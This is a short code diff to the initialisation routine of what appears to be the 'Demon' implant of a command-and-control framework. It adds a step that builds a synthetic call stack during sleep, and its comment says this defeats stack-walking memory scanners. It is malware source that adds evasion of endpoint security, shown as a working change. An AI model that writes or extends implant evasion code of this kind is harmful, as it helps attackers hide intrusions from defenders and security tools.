@@ -597,6 +597,18 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     }
 
     PRINTF( "Instance DemonID => %x\n", Instance->Session.AgentID )
+
+#if _WIN64
+    /* Initialize synthetic call stack for sleep obfuscation.
+     * This scans ntdll/kernel32 for legitimate return addresses
+     * so we can fabricate a believable thread pool call stack
+     * during sleep to defeat stack-walking memory scanners. */
+    if ( Instance->Config.Implant.StackSpoof ) {
+        if ( ! SynthStackInit( &Instance->Session.SynthStack ) ) {
+            PUTS( "SynthStackInit failed — falling back to basic stack spoof" )
+        }
+    }
+#endif
 }
 
 VOID DemonConfig()
